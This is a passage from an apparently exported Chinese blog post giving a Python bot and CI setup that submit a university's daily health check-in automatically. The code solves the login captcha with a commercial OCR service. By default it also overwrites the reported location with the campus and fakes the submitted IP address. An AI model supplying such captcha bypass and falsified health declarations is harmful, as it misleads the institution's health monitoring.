self.logger.info('健康打卡填报阶段, 成功!')\n        else:\n            raise Exception('健康打卡填报阶段, 失败!')\n        self.check()\n\n    @retry(stop_max_attempt_number=3)\n    def check(self):\n        \"\"\"打卡完毕后复检\"\"\"\n        req = self.sessions.get(URL_MAP['CHECK'], headers=HEADERS)\n        last_time = req.json()['entities'][0]['update']\n        local_time = time.strftime(\"%Y/%m/%d %H:%M:%S\", time.localtime(last_time))\n        update = round(time.time()) - last_time\n        if update > 5:\n            self.logger.error('上次打卡完成于%ss前,打卡可能未成功!', update)\n            raise Exception('打卡复检状态异常!')\n        else:\n            self.logger.info('打卡完成于%s', local_time)\n\n\nif __name__ == '__main__':\n    BOT = Bot('config.ini')\n\n```\n\n# Coding\n\n## 创建项目\n登录[Coding](https://e.coding.net/login)， 进入团队，切换到项目（左边栏点击'项目'），创建项目，选择DevOps项目。\n\n## 创建代码仓库\n切换到代码仓库，新建代码仓库，勾选启用READEME.md文件初始化项目，取消启用代码扫描，点击确认。\n![](https://cdn.file.todest.cn/blog/pic/20201205164547.png)\n\n## 上传文件\n新建文件main.py，将完整代码粘贴进去，点击提交并直接确认。\n![](https://cdn.file.todest.cn/blog/pic/20201205164816.png)\n点击上方浏览返回文件根目录，再次创建文件Jenkinsfile (注: 无文件名后缀，请不要自行发挥)，粘贴下面代码并提交，并重复此步骤将修改好的config.ini上传。\n```yml Jenkinsfile\npipeline {\n  agent {\n    any {\n      reuseNode true\n    }\n\n  }\n  stages {\n    stage('检出') {\n      steps {\n        checkout([\n          $class: 'GitSCM',\n          branches: [[name: env.GIT_BUILD_REF]],\n          userRemoteConfigs: [[\n            url: env.GIT_REPO_URL,\n            credentialsId: env.CREDENTIALS_ID\n          ]]])\n        }\n      }\n      stage('安装依赖') {\n        steps {\n          sh '''pip3 install --upgrade pip\npip3 install setuptools\npip3 install requests\npip3 install bs4\npip3 install configparser\npip3 install retrying'''\n        }\n      }\n      stage('运行') {\n        steps {\n          sh 'python3 main.py'\n        }\n      }\n    }\n  }\n```\n\n## 创建构建计划\n切换到持续集成->构建计划，创建构建计划，翻到最下面选择自定义构建过程，代码仓库选择此代码仓库，配置来源勾选上使用代码库中的Jenkinsfile，点击确认。\n![](https://cdn.file.todest.cn/blog/pic/20201205165857.png)\n保存并构建，确认，立即构建，等待构建成功。\n![](https://cdn.file.todest.cn/blog/pic/20201205170328.png)\n\n## 设置定时触发\n点击右上角的设置修改构建计划的配置，切换到触发规则，添加定时触发，设置好触发的时期时间点击确认。\n![](https://cdn.file.todest.cn/blog/pic/20201205170919.png)\n\n## 完成并查看\n如果到了这里还没有出现错误的话，那么就基本没问题了，可以在项目概览查看每次定时触发情况。\n![](https://cdn.file.todest.cn/blog/pic/20201205171438.png)\n也可以点击任务ID查看执行日志。\n![](https://cdn.file.todest.cn/blog/pic/20201205171840.png)\n最后，也可以前往[学校官网](https://ehall.hpu.edu.cn/taskcenter/workflow/done)查看打卡情况。\n## 邮件通知\n一般来说，以目前最新的代码，如果构建失败则打卡失败，所以添加构建失败后邮件提醒还是很有必要的。\n如果想要构建失败后邮件通知的话，需要在个人账户设置->提醒设置里面开启持续集成（构建）邮件提醒。\n![](https://cdn.file.todest.cn/blog/pic/20201207181947.png)\n并且需要在个人账户设置->邮箱设置添加想要接收邮件的邮箱并验证邮箱。\n![](https://cdn.file.todest.cn/blog/pic/20201207182447.png)\n同时，在构建计划设置->通知提醒里面添加成员为自己并修改通知事件为仅失败。\n![](https://cdn.file.todest.cn/blog/pic/20201207182104.png)\n\n\n","source":"_posts/自动健康打卡.md","raw":"---\ntitle: 自动健康打卡\ncategories:\n- 编程语言\n- Python\ntags: Python\nabbrlink: '934e7461'\ndate: 2020-12-01 11:56:35\n---\n自动健康打卡(逃\n\n建议使用Coding定时构建，强烈不推荐使用国外服务器，包括github action。\n**因当天打卡系统异常造成无法打卡时，需等待打卡系统正常后自行打卡或手动触发构建计划。**\n\n**本文档以及代码可能会不定时更新，修复和优化，部署成功的能不能在下面留言告诉一下，且留意本文章是否更新，最后更新时间可以看最上方。**\n<!--more-->\n\n# 配置文件\n注意将config.ini配置项进行修改，申请AK和SK教程见后文。\n```ini config.ini\n[Basic]\n;是否更改健康打卡地址为学校\nCHANGE_DATA = True\n;是否修改IP地址\nCHANGE_ADDR = True\n;自定义IP地址\nIP_ADDR = 223.90.40.4\n\n[API]\n;百度智能云 文字识别OCR AK\nAPI_KEY = your_api_key\n;百度智能云 文字识别OCR SK\nSECRET_KEY = your_secret_key\n\n[User]\n;昵称: ['账号', '密码']\nsample_user: ['username', 'password']\n\n```\n添加用户信息，账号密码为[统一认证](https://uia.hpu.edu.cn)账号密码。\n如需多用户，可在`[User]`下按示例添加新行，注意都为英文符号，昵称随便起，可以为中文。\n\n上述AK以及SK需前往[百度智能云](https://console.bce.baidu.com/ai/#/ai/ocr/app/list)申请文字识别OCR API。\n点击创建应用，依次填写应用名称，文字识别包名为不需要，应用归属为个人，应用描述后，点击立即创建，返回应用列表，即可得到API Key和Secret Key。\n\n\n# 完整代码\n以下是完整代码main.py，无需更改，按之后步骤要求进行上传。\n\n```py main.py\n\"\"\"自动健康打卡\"\"\"\nfrom __future__ import absolute_import\nimport logging\nimport requests\nimport configparser\nimport re\nimport ast\nimport random\nimport time\nfrom bs4 import BeautifulSoup\nfrom retrying import retry\n\n# 固定链接，不建议修改\nURL_MAP = {\n    'HOST': 'https://ehall.hpu.edu.cn/infoplus/form/XSMRJKSB/start',\n    'START': 'https://ehall.hpu.edu.cn/infoplus/interface/start',\n    'ALIVE': 'https://ehall.hpu.edu.cn/infoplus/alive',\n    'CAPTCHA': 'https://uia.hpu.edu.cn/sso/apis/v2/open/captcha?date=',\n    'LOGIN': 'https://uia.hpu.edu.cn/cas/login',\n    'RENDER': 'https://ehall.hpu.edu.cn/infoplus/interface/render',\n    'PROCESS': 'https://ehall.hpu.edu.cn/infoplus/interface/instance/[id]/progress',\n    'NEXTSTEP': 'https://ehall.hpu.edu.cn/infoplus/interface/listNextStepsUsers',\n    'DOACTION': 'https://ehall.hpu.edu.cn/infoplus/interface/doAction',\n    'CHECK': 'https://ehall.hpu.edu.cn/taskcenter/api/me/processes/done?limit=1&start=0',\n    'API': 'https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&client_id=[ak]&client_secret=[sk]',\n    'REQUEST_URL': 'https://aip.baidubce.com/rest/2.0/ocr/v1/general_basic'\n}\n\n# 请求头，可以按需更改\nHEADERS = {\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '\n                  'Chrome/78.0.3904.108 Safari/537.36 QIHU 360EE'\n}\n\n\nclass ReadConfig:\n    \"\"\"读取配置文件类\"\"\"\n\n    def __init__(self, filename):\n        \"\"\"配置文件读取初始化\"\"\"\n        self.config = configparser.ConfigParser()\n        self.config['Basic'] = {\n            'CHANGE_DATA': True,\n            'CHANGE_ADDR': True,\n            'IP_ADDR': '223.90.40.4'\n        }\n        self.config.read(filename, encoding='utf-8')\n\n    def get_basic(self, param):\n        \"\"\"获取Basic配置\"\"\"\n        value = self.config.get('Basic', param)\n        return value\n\n    def get_api(self, param):\n        \"\"\"获取API配置\"\"\"\n        value = self.config.get('API', param)\n        return value\n\n    def get_user(self):\n        \"\"\"获取User配置\"\"\"\n        value = self.config.items('User')\n        return value\n\n\nclass Bot:\n    \"\"\"自动健康打卡类\"\"\"\n\n    def __init__(self, config_file):\n        \"\"\"打卡初始化\"\"\"\n        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')\n        self.logger = logging.getLogger('AutoReport')\n        self.logger.info('程序启动中...')\n\n        # 读取配置文件\n        self.data = ReadConfig(config_file)\n        self.chdata = self.data.get_basic('CHANGE_DATA')\n        self.chaddr = self.data.get_basic('CHANGE_ADDR')\n        self.ipaddr = self.data.get_basic('IP_ADDR')\n\n        self.api_key = self.data.get_api('API_KEY')\n        self.secret_key = self.data.get_api('SECRET_KEY')\n\n        # 登录并打卡\n        for user in self.data.get_user():\n            self.sessions = requests.session()\n            self.login(user)\n            self.post()\n            self.sessions.close()\n\n    @retry(stop_max_attempt_number=3)\n    def login(self, user):\n        \"\"\"登录\"\"\"\n        self.logger.info('%s开始登录中...', user[0])\n\n        # 登录页面\n        req = self.sessions.get(URL_MAP['HOST'], headers=HEADERS)\n        req = self.sessions.get(req.url, headers=HEADERS)\n        soup = BeautifulSoup(req.content, features=\"html.parser\")\n        form = soup.find_all('input', class_='for-form')\n\n        # 验证码获取\n        captcha = URL_MAP['CAPTCHA'] + str(int(round(time.time() * 1000)))\n        req = self.sessions.get(captcha, headers=HEADERS)\n        img = ast.literal_eval(req.content.decode('utf-8'))['img']\n        self.logger.info('验证码获取成功!')\n\n        # 验证码识别\n        api = URL_MAP['API'].replace('[ak]', self.api_key).replace('[sk]', self.secret_key)\n        response = requests.get(api)\n        access_token = response.json()['access_token']\n        request_url = URL_MAP['REQUEST_URL'] + \"?access_token=\" + access_token\n        api_headers = {'content-type': 'application/x-www-form-urlencoded'}\n        response = requests.post(request_url, data={'image': img}, headers=api_headers)\n        captcha = response.json()['words_result'][0]['words']\n        captcha = str(captcha.replace('=?', '')).split('+')\n        captcha = sum(map(int, captcha))\n        self.logger.info('验证码识别成功!')\n\n        # 构造表单\n        token = ast.literal_eval(req.content.decode('utf-8'))['token']\n        account = ast.literal_eval(user[1])\n        formdata = {\n            'username': account[0],\n            'password': account[1],\n            '_eventId': 'submit',\n            'token': token\n        }\n        formdata.update({f['name']: f['value'] for f in form})\n        formdata.update({'captcha': captcha})\n\n        # 登录\n        req = self.sessions.post(URL_MAP['LOGIN'], headers=HEADERS, data=formdata)\n        soup = BeautifulSoup(req.content, features='html.parser')\n        errormes = soup.find('span', id='errormes')\n        if errormes:\n            self.logger.error(errormes['value'])\n            raise Exception(errormes['value'])\n\n        # 检测登录状态\n        url = self.sessions.get(URL_MAP['HOST'], headers=HEADERS).url\n        if not url == URL_MAP['HOST']:\n            self.logger.error('登录失败, 未知错误!')\n            raise Exception('登录失败, 未知错误!')\n        else:\n            self.logger.info('使用账号密码登录成功!')\n\n    @retry(stop_max_attempt_number=3)\n    def post(self):\n        \"\"\"打卡\"\"\"\n        self.logger.info('打卡进行中...')\n        req = self.sessions.get(URL_MAP['HOST'], headers=HEADERS)\n        soup = BeautifulSoup(req.content, features='html.parser')\n\n        # 构造表单\n        csrf = soup.find('meta', itemscope='csrfToken')['content']\n        formdata = {\n            'idc': 'XSMRJKSB',\n            'release': '',\n            'csrfToken': csrf,\n            'formData': '{\"_VAR_URL\":\"https://ehall.hpu.edu.cn/infoplus/form/XSMRJKSB/start\",\"_VAR_URL_Attr\":\"{}\"}'\n        }\n        req = self.sessions.post(URL_MAP['START'], headers=HEADERS, data=formdata)\n        url = req.json()['entities'][0]\n\n        # 构造表单\n        stepid = int(re.findall(r'\\d+', url)[0])\n        self.logger.info('开始流程%s中...', stepid)\n        formdata = {\n            'stepId': stepid,\n            'instanceId': '',\n            'admin': 'false',\n            'rand': random.random() * 999,\n            'width': '1747',\n            'lang': 'zh',\n            'csrfToken': csrf\n        }\n        HEADERS.update({'Referer': url})\n        req = self.sessions.post(URL_MAP['RENDER'], headers=HEADERS, data=formdata)\n        self.logger.info('已加载审批表!')\n        form = req.json()['entities'][0]\n\n        # 构造表单\n        instanceid = form['step']['instanceId']\n        formdata = {\n            'stepId': stepid,\n            'includingTop': 'true',\n            'csrfToken': csrf,\n            'lang': 'zh'\n        }\n        req = self.sessions.post(URL_MAP['PROCESS'].replace('[id]', instanceid), headers=HEADERS, data=formdata)\n        self.logger.info('审批表处理中...')\n        timestamp = req.json()['entities'][0]['remarks'][0]['assignTime']\n        boundfields = ','.join(list(form['data'].keys()))\n\n        # 构造表单\n        postdata = form['data']\n        if self.chdata:\n            fixdata = {\n                'fieldTXcs': '410800',\n                'fieldTXcs_Name': '焦作市',\n                'fieldTXdq': '410811',\n                'fieldTXdq_Name': '山阳区',\n                'fieldTXjtwz': '河南理工大学'\n            }\n            postdata.update(fixdata)\n        if self.chaddr:\n            postdata.update({'_VAR_ADDR': self.ipaddr})\n        formdata = {\n            'stepId': stepid,\n            'actionId': 1,\n            'formData': str(postdata),\n            'timestamp': timestamp,\n            'rand': random.random() * 999,\n            'boundFields': boundfields,\n            'csrfToken': csrf,\n            'lang': 'zh'\n        }\n        req = self.sessions.post(URL_MAP['NEXTSTEP'], headers=HEADERS, data=formdata)\n        if req.json()['ecode'] == 'SUCCEED':\n            self.logger.info('健康打卡准备阶段, 成功!')\n        else:\n            raise Exception('健康打卡准备阶段, 失败!')\n\n        # 构造表单\n        formdata = {\n            'actionId': 1,\n            'formData': str(form['data']),\n            'remark': '',\n            'rand': random.random() * 999,\n            'nextUsers': '{}',\n            'stepId': stepid,\n            'timestamp': timestamp,\n            'boundFields': boundfields,\n            'csrfToken': csrf,\n            'lang': 'zh'\n        }\n        req = self.sessions.post(URL_MAP['DOACTION'], headers=HEADERS, data=formdata)\n        if req.json()['ecode'] == 'SUCCEED':\n            self.logger.info('健康打卡填报阶段, 成功!')\n        else:\n            raise Exception('健康打卡填报阶段, 失败!')\n        self.check()\n\n    @retry(stop_max_attempt_number=3)\n    def check(self):\n        \"\"\"打卡完毕后复检\"\"\"\n        req = self.sessions.get(URL_MAP['CHECK'], headers=HEADERS)\n        last_time = req.json()['entities'][0]['update']\n        local_time = time.strftime(\"%Y/%m/%d %H:%M:%S\", time.localtime(last_time))\n        update = round(time.time()) - last_time\n        if update > 5:\n            self.logger.error('上次打卡完成于%ss前,打卡可能未成功!', update)\n            raise Exception('打卡复检状态异常!')\n        else:\n            self.logger.info('打卡完成于%s', local_time)\n\n\nif __name__ == '__main__':\n    BOT = Bot('config.ini')\n\n```\n\n# Coding\n\n## 创建项目\n登录[Coding](https://e.coding.net/login)， 进入团队，切换到项目（左边栏点击'项目'），创建项目，选择DevOps项目。\n\n## 创建代码仓库\n切换到代码仓库，新建代码仓库，勾选启用READEME.md文件初始化项目，取消启用代码扫描，点击确认。\n![](https://cdn.file.todest.cn/blog/pic/20201205164547.png)\n\n## 上传文件\n新建文件main.py，将完整代码粘贴进去，点击提交并直接确认。\n![](https://cdn.file.todest.cn/blog/pic/20201205164816.png)\n点击上方浏览返回文件根目录，再次创建文件Jenkinsfile (注: 无文件名后缀，请不要自行发挥)，粘贴下面代码并提交，并重复此步骤将修改好的config.ini上传。\n```yml Jenkinsfile\npipeline {\n  agent {\n    any {\n      reuseNode true\n    }\n\n  }\n  stages {\n    stage('检出') {\n      steps {\n        checkout([\n          $class: 'GitSCM',\n          branches: [[name: env.GIT_BUILD_REF]],\n          userRemoteConfigs: [[\n            url: env.GIT_REPO_URL,\n            credentialsId: env.CREDENTIALS_ID\n          ]]])\n        }\n      }\n      stage('安装依赖') {\n        steps {\n          sh '''pip3 install --upgrade pip\npip3 install setuptools\npip3 install requests\npip3 install bs4\npip3 install configparser\npip3 install retrying'''\n        }\n      }\n      stage('运行') {\n        steps {\n          sh 'python3 main.py'\n        }\n      }\n    }\n  }\n```\n\n## 创建构建计划\n切换到持续集成->构建计划，创建构建计划，翻到最下面选择自定义构建过程，代码仓库选择此代码仓库，配置来源勾选上使用代码库中的Jenkinsfile，点击确认。\n![](https://cdn.file.todest.cn/blog/pic/20201205165857.png)\n保存并构建，确认，立即构建，等待构建成功。\n![](https://cdn.file.todest.cn/blog/pic/20201205170328.png)\n\n## 设置定时触发\n点击右上角的设置修改构建计划的配置，切换到触发规则，添加定时触发，设置好触发的时期时间点击确认。\n![](https://cdn.file.todest.cn/blog/pic/20201205170919.png)\n\n## 完成并查看\n如果到了这里还没有出现错误的话，那么就基本没问题了，可以在项目概览查看每次定时触发情况。\n![](https://cdn.file.todest.cn/blog/pic/20201205171438.png)\n也可以点击任务ID查看执行日志。\n![](https://cdn.file.todest.cn/blog/pic/20201205171840.png)\n最后，也可以前往[学校官网](https://ehall.hpu.edu.cn/taskcenter/workflow/done)查看打卡情况。\n## 邮件通知\n一般来说，以目前最新的代码，如果构建失败则打卡失败，所以添加构建失败后邮件提醒还是很有必要的。\n如果想要构建失败后邮件通知的话，需要在个人账户设置->提醒设置里面开启持续集成（构建）邮件提醒。\n![](https://cdn.file.todest.cn/blog/pic/20201207181947.png)\n并且需要在个人账户设置->邮箱设置添加想要接收邮件的邮箱并验证邮箱。\n![](https://cdn.file.todest.cn/blog/pic/20201207182447.png)\n同时，在构建计划设置->通知提醒里面添加成员为自己并修改通知事件为仅失败。\n![](https://cdn.file.todest.cn/blog/pic/20201207182104.png)\n\n\n","slug":"自动健康打卡","published":1,"updated":"2020-12-07T10:29:11.695Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexke1003uqse55jhw6h4d","content":"<p>自动健康打卡(逃</p>\n<p>建议使用Coding定时构建，强烈不推荐使用国外服务器，包括github action。<br><strong>因当天打卡系统异常造成无法打卡时，需等待打卡系统正常后自行打卡或手动触发构建计划。</strong></p>\n<p><strong>本文档以及代码可能会不定时更新，修复和优化，部署成功的能不能在下面留言告诉一下，且留意本文章是否更新，最后更新时间可以看最上方。</strong><br><a id=\"more\"></a></p>\n<h1 id=\"配置文件\"><a href=\"#配置文件\" class=\"headerlink\" title=\"配置文件\"></a>配置文件</h1><p>注意将config.ini配置项进行修改，申请AK和SK教程见后文。<br><figure class=\"highlight ini\"><figcaption><span>config.ini</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[Basic]</span></span><br><span class=\"line\"><span class=\"comment\">;是否更改健康打卡地址为学校</span></span><br><span class=\"line\"><span class=\"attr\">CHANGE_DATA</span> = <span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"comment\">;是否修改IP地址</span></span><br><span class=\"line\"><span class=\"attr\">CHANGE_ADDR</span> = <span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"comment\">;自定义IP地址</span></span><br><span class=\"line\"><span class=\"attr\">IP_ADDR</span> = <span class=\"number\">223.90</span>.<span class=\"number\">40.4</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[API]</span></span><br><span class=\"line\"><span class=\"comment\">;百度智能云 文字识别OCR AK</span></span><br><span class=\"line\"><span class=\"attr\">API_KEY</span> = your_api_key</span><br><span class=\"line\"><span class=\"comment\">;百度智能云 文字识别OCR SK</span></span><br><span class=\"line\"><span class=\"attr\">SECRET_KEY</span> = your_secret_key</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[User]</span></span><br><span class=\"line\"><span class=\"comment\">;昵称: [&#x27;账号&#x27;, &#x27;密码&#x27;]</span></span><br><span class=\"line\">sample_user: [&#x27;username&#x27;, &#x27;password&#x27;]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><br>添加用户信息，账号密码为<a href=\"https://uia.hpu.edu.cn\">统一认证</a>账号密码。<br>如需多用户，可在<code>[User]</code>下按示例添加新行，注意都为英文符号，昵称随便起，可以为中文。</p>\n<p>上述AK以及SK需前往<a href=\"https://console.bce.baidu.com/ai/#/ai/ocr/app/list\">百度智能云</a>申请文字识别OCR API。<br>点击创建应用，依次填写应用名称，文字识别包名为不需要，应用归属为个人，应用描述后，点击立即创建，返回应用列表，即可得到API Key和Secret Key。</p>\n<h1 id=\"完整代码\"><a href=\"#完整代码\" class=\"headerlink\" title=\"完整代码\"></a>完整代码</h1><p>以下是完整代码main.py，无需更改，按之后步骤要求进行上传。</p>\n<figure class=\"highlight py\"><figcaption><span>main.py</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;自动健康打卡&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> __future__ <span class=\"keyword\">import</span> absolute_import</span><br><span class=\"line\"><span class=\"keyword\">import</span> logging</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> configparser</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> ast</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</span><br><span class=\"line\"><span class=\"keyword\">from</span> retrying <span class=\"keyword\">import</span> retry</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 固定链接，不建议修改</span></span><br><span class=\"line\">URL_MAP = &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;HOST&#x27;</span>: <span class=\"string\">&#x27;https://ehall.hpu.edu.cn/infoplus/form/XSMRJKSB/start&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;START&#x27;</span>: <span class=\"string\">&#x27;https://ehall.hpu.edu.cn/infoplus/interface/start&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;ALIVE&#x27;</span>: <span class=\"string\">&#x27;https://ehall.hpu.edu.cn/infoplus/alive&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;CAPTCHA&#x27;</span>: <span class=\"string\">&#x27;https://uia.hpu.edu.cn/sso/apis/v2/open/captcha?date=&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;LOGIN&#x27;</span>: <span class=\"string\">&#x27;https://uia.hpu.edu.cn/cas/login&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;RENDER&#x27;</span>: <span class=\"string\">&#x27;https://ehall.hpu.edu.cn/infoplus/interface/render&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;PROCESS&#x27;</span>: <span class=\"string\">&#x27;https://ehall.hpu.edu.cn/infoplus/interface/instance/[id]/progress&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;NEXTSTEP&#x27;</span>: <span 